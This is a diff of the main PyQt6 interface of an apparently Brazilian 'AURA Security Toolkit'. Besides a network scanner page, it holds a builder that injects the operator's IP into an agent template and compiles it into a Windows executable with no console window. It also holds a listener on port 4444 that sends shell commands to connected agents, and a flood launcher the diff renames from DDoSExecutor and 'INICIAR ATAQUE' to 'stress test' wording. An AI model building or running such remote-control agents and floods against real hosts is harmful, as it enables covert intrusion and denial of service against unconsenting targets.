@@ -10,7 +10,6 @@ import socket
 import threading
 from datetime import datetime
 
-# Importações PyQt6
 from PyQt6.QtCore import (
     Qt, QTimer, QTime, QSize, 
     QLocale, QThread, pyqtSignal, QPropertyAnimation, QPoint, QEasingCurve
@@ -23,11 +22,12 @@ from PyQt6.QtWidgets import (
     QApplication, QMainWindow, QWidget, QLabel, QStackedWidget,
     QVBoxLayout, QHBoxLayout, QFrame, QPushButton, QSpacerItem,
     QSizePolicy, QLineEdit, QGroupBox, QScrollArea, QGraphicsDropShadowEffect,
-    QMessageBox
+    QMessageBox, QCheckBox, QSpinBox, QTextEdit
 )
 from random import randint 
 
-# Importações de módulos internos 
+from core.stress_test import StressTestExecutor
+
 from core.components import (
     NeonCard, ConfigPage, 
     load_language_json, lang_get 
@@ -41,7 +41,6 @@ from core.config import (
 
 # --- 1. CLASSE WORKER (Para não congelar a UI durante o Nmap) ---
 class ScannerWorker(QThread):
-# (Código mantido)
     finished = pyqtSignal(list)
     error = pyqtSignal(str)
 
@@ -59,7 +58,6 @@ class ScannerWorker(QThread):
 
 # --- 2. CLASSE DA PÁGINA DE SCANNER ---
 class ScannerPage(QWidget):
-# (Código mantido)
     def __init__(self, parent_window):
         super().__init__()
         self.parent_window = parent_window
@@ -109,7 +107,6 @@ class ScannerPage(QWidget):
         self.setLayout(layout)
 
     def update_ui_language(self, L):
-        # (Código mantido)
         self.start_button.setText(lang_get(L, "scanner_page.start_scan", "Iniciar Varredura Nmap"))
         self.save_button.setText(lang_get(L, "scanner_page.save_results", "Salvar Resultados no Logs/Relatórios"))
         self.ip_input.setPlaceholderText(lang_get(L, "scanner_page.ip_placeholder", "Ex: 192.168.1.1, 10.0.0.0/24, etc."))
@@ -124,7 +121,6 @@ class ScannerPage(QWidget):
             self.results_text.setText(lang_get(L, "scanner_page.awaiting_scan", "Aguardando varredura..."))
 
     def start_scan(self):
-        # (Código mantido)
         ips_raw = self.ip_input.text()
         if not ips_raw.strip():
             self.results_text.setText("Por favor, insira pelo menos um IP ou range.")
@@ -148,7 +144,6 @@ class ScannerPage(QWidget):
         self.worker.start()
 
     def scan_finished(self, results: list):
-        # (Código mantido)
         self.last_results = results
         self.start_button.setEnabled(True)
         self.save_button.setEnabled(True)
@@ -183,14 +178,12 @@ class ScannerPage(QWidget):
         self.results_text.setText(display_text)
 
     def scan_error(self, message):
-        # (Código mantido)
         self.start_button.setEnabled(True)
         self.parent_window.status_label.setText("ERRO durante varredura!")
         self.results_text.setText(f"Um erro inesperado ocorreu: {message}. Verifique se o Nmap está instalado e se você tem permissões de sudo.")
         self.last_results = None
 
     def save_results(self):
-        # (Código mantido)
         if self.last_results:
             log_dir = os.path.join(self.parent_window.base_dir, "logs")
             os.makedirs(log_dir, exist_ok=True)
@@ -218,7 +211,6 @@ class FirewallPage(QWidget):
         layout.setContentsMargins(30, 30, 30, 30)
         layout.setSpacing(20)
 
-        # Título e Explicação
         title_label = QLabel("🛡️ Teste de Firewall e Acesso Remoto")
         title_label.setFont(QFont("Arial", 18, QFont.Weight.Bold))
         layout.addWidget(title_label)
@@ -233,7 +225,6 @@ class FirewallPage(QWidget):
         description.setStyleSheet(f"color: {THEMES['dark']['text_secondary']};")
         layout.addWidget(description)
 
-        # Grupo de Ações
         action_group = QGroupBox("Execução do Teste")
         action_layout = QVBoxLayout()
         
@@ -252,7 +243,6 @@ class FirewallPage(QWidget):
         action_group.setLayout(action_layout)
         layout.addWidget(action_group)
 
-        # Console de Log
         self.log_output = QLabel("Aguardando comando...")
         self.log_output.setStyleSheet("""
             background-color: #050505; 
@@ -276,13 +266,11 @@ class FirewallPage(QWidget):
             self.btn_local.setText("Teste em Andamento...")
             self.log_output.setText("<b>[INFO]</b> O teste de interação foi iniciado.")
             
-            # Executa o teste
             run_interaction_test(self.parent_window)
             
             self.btn_local.setEnabled(True)
             self.btn_local.setText("Iniciar no Computador Local")
             
-            # ATUALIZAÇÃO: Busca o log e exibe
             log_path = os.path.join(self.parent_window.base_dir, "logs", "teste_interacao.log")
             self.update_log_view(log_path)
             
@@ -297,7 +285,6 @@ class FirewallPage(QWidget):
             if os.path.exists(path):
                 with open(path, "r", encoding="utf-8") as f:
                     content = f.read()
-                    # Pega apenas os últimos 500 caracteres para não travar a UI
                     self.log_output.setText(f"<pre>{content[-500:]}</pre>")
             else:
                 self.log_output.setText("<b>[INFO]</b> Teste concluído, mas o arquivo de log não foi gerado.")
@@ -306,8 +293,6 @@ class FirewallPage(QWidget):
 
     def update_ui_language(self, L):
         self.L = L
-        # (Opcional) Adicione traduções para os botões desta página aqui
-        # Adicionar aqui depois, nao posso esquecer!!!
 
 # --- PAGINA DO AGENTE (Ta dificil para um karalho de resolver isso) ---
 
@@ -330,7 +315,6 @@ class PayloadPage(QWidget):
         desc.setStyleSheet("color: #aaaaaa;")
         layout.addWidget(desc)
 
-        # Botões de Seleção
         self.btn_win = QPushButton("🪟 Gerar Agente para Windows (.exe)")
         self.btn_win.setFixedHeight(50)
         self.btn_win.setCursor(Qt.CursorShape.PointingHandCursor)
@@ -354,7 +338,6 @@ class PayloadPage(QWidget):
 
         layout.addStretch()
         
-        # Botão Voltar
         btn_back = QPushButton("⬅ Voltar")
         btn_back.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(6))
         layout.addWidget(btn_back)
@@ -363,7 +346,6 @@ class PayloadPage(QWidget):
         import socket
         import subprocess
         
-        # 1. Tenta obter o seu IP automaticamente para injetar no agente
         try:
             s_temp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s_temp.connect(("8.8.8.8", 80))
@@ -376,11 +358,9 @@ class PayloadPage(QWidget):
         QApplication.processEvents()
 
         try:
-            # Caminhos de pasta
             payload_dir = os.path.join(self.parent_window.base_dir, "logs", "payloads")
             os.makedirs(payload_dir, exist_ok=True)
             
-            # 2. Localiza o seu arquivo aura_agent.py original
             agent_template_path = os.path.join(self.parent_window.base_dir, "core", "aura_agent.py")
             
             if not os.path.exists(agent_template_path):
@@ -390,7 +370,6 @@ class PayloadPage(QWidget):
             with open(agent_template_path, "r", encoding="utf-8") as f:
                 content = f.read()
 
-            # 3. Injeta o seu IP no lugar do "SEU_IP_AQUI"
             content = content.replace('###IP_CONFIG###', my_ip)
 
             if os_type == "linux":
@@ -408,8 +387,6 @@ class PayloadPage(QWidget):
                 self.status_log.setText("<b>[INFO]</b> Compilando EXE... Aguarde.")
                 QApplication.processEvents()
 
-                # USANDO O PYTHON ATUAL PARA CHAMAR O PYINSTALLER (Mais seguro em VENV)
-                # sys.executable garante que ele use o Python do seu ambiente virtual
                 import sys
                 cmd = f'"{sys.executable}" -m PyInstaller --onefile --noconsole --noconfirm --distpath "{payload_dir}" "{temp_py}"'
                 
@@ -419,7 +396,6 @@ class PayloadPage(QWidget):
                 if processo.returncode == 0:
                     self.status_log.setText(f"<b>[SUCESSO]</b> Agente gerado!<br>Arquivo: <b>temp_win_agent.exe</b>")
                 else:
-                    # Se falhar, vamos imprimir o erro exato no terminal do seu VS Code/PyCharm
                     print(f"ERRO DE COMPILAÇÃO:\n{stderr.decode()}")
                     self.status_log.setText("<b>[ERRO]</b> Falha ao compilar. Verifique o terminal.")
 
@@ -448,21 +424,18 @@ class ListenerPage(QWidget):
         self.status_conn.setStyleSheet("color: orange; font-weight: bold;")
         layout.addWidget(self.status_conn)
 
-        # Console de logs
         self.console_output = QLabel("Log do Servidor...")
         self.console_output.setStyleSheet("background-color: black; color: #00ff00; padding: 10px; font-family: 'Consolas';")
         self.console_output.setWordWrap(True)
         self.console_output.setAlignment(Qt.AlignmentFlag.AlignTop)
         layout.addWidget(self.console_output)
 
-        # Campo para enviar comandos
         self.cmd_input = QLineEdit()
         self.cmd_input.setPlaceholderText("Digite um comando (ex: stress_test, dir, whoami)...")
         self.cmd_input.setEnabled(False)
         self.cmd_input.returnPressed.connect(self.send_command)
         layout.addWidget(self.cmd_input)
 
-        # Botões
         self.btn_listen = QPushButton("Ativar Escuta (Porta 4444)")
         self.btn_listen.clicked.connect(self.start_listening_thread)
         layout.addWidget(self.btn_listen)
@@ -502,55 +475,109 @@ class ListenerPage(QWidget):
 
 # --- DDOS ---
 
-from core.stress_test import DDoSExecutor
-
 class StressTestPage(QWidget):
     def __init__(self, parent_window):
         super().__init__()
         self.parent_window = parent_window
         self.executor = None
+        self.ui_timer = QTimer()
+        self.ui_timer.timeout.connect(self.update_live_metrics)
         self._setup_ui()
 
     def _setup_ui(self):
         layout = QVBoxLayout(self)
         layout.setContentsMargins(30, 30, 30, 30)
-        
-        title = QLabel("🔥 Módulo de Stress Test")
+        layout.setSpacing(15)
+
+        # Cabeçalho Técnico
+        title = QLabel("🛡️ Avaliação de Resiliência de Firewall")
         title.setFont(QFont("Arial", 18, QFont.Weight.Bold))
         layout.addWidget(title)
 
-        # Campos de entrada
+        # Configurações de Alvo
+        target_group = QGroupBox("Parâmetros do Alvo")
+        t_layout = QHBoxLayout()
         self.target_input = QLineEdit()
-        self.target_input.setPlaceholderText("IP do Alvo (Ex: 192.168.1.10)")
-        layout.addWidget(QLabel("Alvo:"))
-        layout.addWidget(self.target_input)
+        self.target_input.setPlaceholderText("IP ou Host")
+        self.port_input = QSpinBox()
+        self.port_input.setRange(1, 65535)
+        self.port_input.setValue(80)
+        t_layout.addWidget(QLabel("Alvo:"))
+        t_layout.addWidget(self.target_input, 3)
+        t_layout.addWidget(QLabel("Porta:"))
+        t_layout.addWidget(self.port_input, 1)
+        target_group.setLayout(t_layout)
+        layout.addWidget(target_group)
 
-        self.threads_input = QLineEdit("100")
-        layout.addWidget(QLabel("Threads (Intensidade):"))
-        layout.addWidget(self.threads_input)
+        # Configurações de Controle
+        ctrl_group = QGroupBox("Controle de Tráfego")
+        c_layout = QVBoxLayout()
+        
+        self.rps_input = QSpinBox()
+        self.rps_input.setRange(1, 2000)
+        self.rps_input.setValue(50)
+        c_layout.addWidget(QLabel("Taxa Limite (Req/Segunda - RPS):"))
+        c_layout.addWidget(self.rps_input)
 
-        self.status_label = QLabel("Status: Pronto")
-        layout.addWidget(self.status_label)
+        self.duration_input = QSpinBox()
+        self.duration_input.setRange(5, 600)
+        self.duration_input.setValue(30)
+        c_layout.addWidget(QLabel("Duração do Teste (Segundos):"))
+        c_layout.addWidget(self.duration_input)
 
-        self.btn_action = QPushButton("INICIAR ATAQUE")
+        self.gradual_check = QCheckBox("Escalonamento Gradual (Ramp-up)")
+        c_layout.addWidget(self.gradual_check)
+        
+        ctrl_group.setLayout(c_layout)
+        layout.addWidget(ctrl_group)
+
+        # DASHBOARD DE MÉTRICAS (VISUAL)
+        self.metrics_box = QTextEdit()
+        self.metrics_box.setReadOnly(True)
+        self.metrics_box.setStyleSheet("background: black; color: #00ff00; font-family: Consolas; font-size: 14px;")
+        self.metrics_box.setText("Aguardando início do teste...")
+        layout.addWidget(self.metrics_box)
+
+        self.btn_action = QPushButton("⚡ INICIAR AUDITORIA DE TRÁFEGO")
         self.btn_action.setFixedHeight(50)
         self.btn_action.clicked.connect(self.toggle_test)
         layout.addWidget(self.btn_action)
-        
-        layout.addStretch()
 
     def toggle_test(self):
         if self.executor and self.executor.is_running:
-            self.executor.stop()
-            self.btn_action.setText("INICIAR ATAQUE")
-            self.status_label.setText("Status: Parado.")
+            self.executor.is_running = False
+            self.btn_action.setText("⚡ INICIAR AUDITORIA DE TRÁFEGO")
         else:
-            target = self.target_input.text()
-            threads = int(self.threads_input.text())
-            self.executor = DDoSExecutor(target, 80, threads)
-            self.executor.start()
-            self.btn_action.setText("PARAR ATAQUE")
-            self.status_label.setText(f"Status: Atacando {target}...")
+            self.executor = StressTestExecutor(
+                target=self.target_input.text(),
+                port=self.port_input.value(),
+                rps_limit=self.rps_input.value(),
+                duration=self.duration_input.value(),
+                gradual=self.gradual_check.isChecked()
+            )
+            threading.Thread(target=self.executor.run, daemon=True).start()
+            self.ui_timer.start(500) # Atualiza a cada meio segundo
+            self.btn_action.setText("🛑 INTERROMPER TESTE")
+
+    def update_live_metrics(self):
+        if not self.executor: return
+        
+        s = self.executor.stats
+        report = (
+            f"--- MÉTRICAS EM TEMPO REAL ---\n"
+            f"Total Enviado: {s['total_sent']}\n"
+            f"Sucesso (200 OK): {s['success']}\n"
+            f"Bloqueio DROP (Timeout): {s['timeout_drop']}\n"
+            f"Bloqueio REJECT (RST): {s['reset_reject']}\n"
+            f"Latência Média: {round(s['avg_latency'], 2)}ms\n"
+            f"-----------------------------\n"
+            f"Status: {'EXECUTANDO' if self.executor.is_running else 'FINALIZADO'}"
+        )
+        self.metrics_box.setText(report)
+        
+        if not self.executor.is_running:
+            self.ui_timer.stop()
+            self.btn_action.setText("⚡ INICIAR AUDITORIA DE TRÁFEGO")
 
 # --- CLASSE PRINCIPAL (MainWindow) ---
 
@@ -568,7 +595,7 @@ class MainWindow(QMainWindow):
         self.theme_manager = ThemeManager(self.user_settings)
         
         self.current_lang_code = self.user_settings.get('language', 'pt') 
-        self.L = load_language_json(self.current_lang_code, self.base_dir) # ⚠️ Passa base_dir
+        self.L = load_language_json(self.current_lang_code, self.base_dir)
         
         self.setWindowTitle("AURA Security Toolkit")
         self.setGeometry(100, 100, 1200, 800)
@@ -579,14 +606,12 @@ class MainWindow(QMainWindow):
         self.update_ui_language(self.current_lang_code)
 
     def _build_ui(self):
-        # 1. Configuração do Widget Central e Layout Principal
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
         main_layout = QHBoxLayout(central_widget)
         main_layout.setContentsMargins(0, 0, 0, 0)
         main_layout.setSpacing(0)
 
-        # 2. Construção da Sidebar (Lado Esquerdo)
         self.sidebar = QFrame()
         self.sidebar.setFixedWidth(200)
         self.sidebar.setObjectName("Sidebar")
@@ -594,7 +619,6 @@ class MainWindow(QMainWindow):
         sidebar_layout.setContentsMargins(10, 20, 10, 10)
         sidebar_layout.setSpacing(10)
         
-        # Título Aura
         self.title_label = QLabel("AURA")
         self.title_label.setFont(QFont("Arial", 24, QFont.Weight.Bold))
         self.title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
@@ -602,7 +626,6 @@ class MainWindow(QMainWindow):
         self.title_label.setObjectName("AuraTitle")
         sidebar_layout.addWidget(self.title_label)
         
-        # Botões da Sidebar
         self.btn_home = self._make_sidebar_button("Home", "🏠")
         self.btn_tools = self._make_sidebar_button("Ferramentas", "🛠️") 
         self.btn_scanner = self._make_sidebar_button("Scanner", "🛰️") 
@@ -623,14 +646,12 @@ class MainWindow(QMainWindow):
         
         main_layout.addWidget(self.sidebar)
 
-        # 3. Área de Conteúdo (Lado Direito)
         self.content_frame = QFrame() 
         self.content_frame.setObjectName("ContentFrame")
         content_v_layout = QVBoxLayout(self.content_frame)
         content_v_layout.setContentsMargins(0, 0, 0, 0)
         content_v_layout.setSpacing(0)
         
-        # O gerenciador de páginas (Stack)
         self.pages = QStackedWidget()
         
         # --- CRIAÇÃO DAS PÁGINAS ---
@@ -643,7 +664,6 @@ class MainWindow(QMainWindow):
         self.welcome_label.setFont(QFont("Arial", 16, QFont.Weight.Bold))
         home_layout.addWidget(self.welcome_label)
         
-        # Layout de Cards na Home
         card_layout = QHBoxLayout()
         self.card_scanner = NeonCard("🛰️", "Varredura de Rede", "Identifica hosts e portas.", self.theme_manager.neon_color, self.theme_manager)
         self.card_scanner.on_card_activated = lambda: self.pages.setCurrentIndex(2) 
@@ -713,7 +733,6 @@ class MainWindow(QMainWindow):
         content_v_layout.addWidget(self.pages)
         main_layout.addWidget(self.content_frame)
 
-        # 4. Conexões dos Botões da Sidebar
         self.btn_home.clicked.connect(lambda: self.pages.setCurrentIndex(0))
         self.btn_tools.clicked.connect(lambda: self.pages.setCurrentIndex(1))
         self.btn_scanner.clicked.connect(lambda: self.pages.setCurrentIndex(2))
@@ -722,7 +741,6 @@ class MainWindow(QMainWindow):
         self.btn_config.clicked.connect(lambda: self.pages.setCurrentIndex(5))
 
     def _make_sidebar_button(self, text, icon):
-        # (Código mantido)
         btn = QPushButton(f"  {icon} {text}")
         btn.setObjectName("SidebarButton")
         btn.setFixedHeight(40)
@@ -739,7 +757,6 @@ class MainWindow(QMainWindow):
     # ----------------- Gerenciamento de Tema -----------------
 
     def get_theme_colors(self, theme_key=None):
-        # (Código mantido)
         return THEMES.get(theme_key or self.theme_manager.current_theme, THEMES['dark'])
 
     def _apply_theme(self, theme_key):
@@ -839,7 +856,6 @@ class MainWindow(QMainWindow):
         """
         self.setStyleSheet(style)
         
-        # Atualiza a cor neon em todos os NeonCards
         for card in self.findChildren(NeonCard):
             card.set_neon_color(neon_color, self.theme_manager.current_theme)
 
@@ -847,12 +863,10 @@ class MainWindow(QMainWindow):
     # ----------------- Métodos de Configuração (Chamados pela ConfigPage) -----------------
 
     def apply_base_theme(self, theme_name):
-        # (Código mantido)
         self.theme_manager.set_base_theme(theme_name)
         self._apply_theme(theme_name)
         
     def set_global_neon_color(self, color):
-        # (Código mantido)
         self.theme_manager.set_neon_color(color)
         self._apply_theme(self.theme_manager.current_theme) 
 
@@ -868,7 +882,6 @@ class MainWindow(QMainWindow):
         
         lang_code = lang_map.get(lang_name, "pt")
         
-        # ⚠️ CORREÇÃO: Carrega o novo dicionário L antes de atualizar a UI
         new_L = load_language_json(lang_code, self.base_dir) 
         self.L = new_L
         self.current_lang_code = lang_code
@@ -881,7 +894,6 @@ class MainWindow(QMainWindow):
         """Atualiza todos os textos da UI com base no dicionário de idioma carregado (self.L)."""
         L = self.L 
         
-        # Sidebar
         self.btn_home.setText("  " + lang_get(L, "sidebar.home", "🏠 Home"))
         self.btn_tools.setText("  " + lang_get(L, "sidebar.tools", "🛠️ Ferramentas"))
         self.btn_scanner.setText("  " + lang_get(L, "sidebar.scanner", "🛰️ Scanner")) 
@@ -894,21 +906,18 @@ class MainWindow(QMainWindow):
         self.config_page.update_ui_language(L) 
         self.scanner_page.update_ui_language(L)
         
-        # Atualização da Página Home
         self.welcome_label.setText(lang_get(L, "home_page.welcome", "Bem-vindo ao AURA Security Toolkit!")) 
         
-        # Cards na Home (Ajustei as chaves para corresponder ao seu en.json/pt.json completo)
         self.card_scanner.set_texts(
             lang_get(L, "cards.scanner.title", "Varredura de Rede"),
             lang_get(L, "cards.scanner.subtitle", "Varre e detecta hosts")
         )
-        # Dentro do update_ui_language(self, lang_code):
         self.card_bruteforce.set_texts(
             lang_get(L, "cards.stress.title", "Teste de Stress (DDoS)"), 
             lang_get(L, "cards.stress.subtitle", "Testar resiliência do alvo")
         )
         self.card_firewall.set_texts(
-            lang_get(L, "cards.ports.title", "Analisador de Portas (Ex. Firewall)"), # Usando uma chave temporária
+            lang_get(L, "cards.ports.title", "Analisador de Portas (Ex. Firewall)"),
             lang_get(L, "cards.ports.subtitle", "Testa portas específicas")
         )
         
@@ -918,11 +927,9 @@ class MainWindow(QMainWindow):
     # ----------------- closeEvent (Persistência) -----------------
     
     def closeEvent(self, event):
-        # 1. Para o DDoS se estiver rodando
         if hasattr(self, 'stress_page') and self.stress_page.executor:
-            self.stress_page.executor.stop() # Esta linha PRECISA de 4 espaços a mais que o IF
+            self.stress_page.executor.stop()
         
-        # 2. Salva as configurações (o que você já tinha)
         self.user_settings['language'] = self.current_lang_code
         self.user_settings['theme'] = self.theme_manager.current_theme
         self.user_settings['neon_color'] = self.theme_manager.neon_color
@@ -942,7 +949,6 @@ if __name__ == "__main__":
 
     app = QApplication(sys.argv)
     
-    # ⚠️ CORREÇÃO: Aplica a paleta inicial corretamente (opcional, mas bom)
     palette = QPalette()
     palette.setColor(QPalette.ColorRole.Window, QColor(THEMES['dark']['bg_main']))
     app.setPalette(palette)
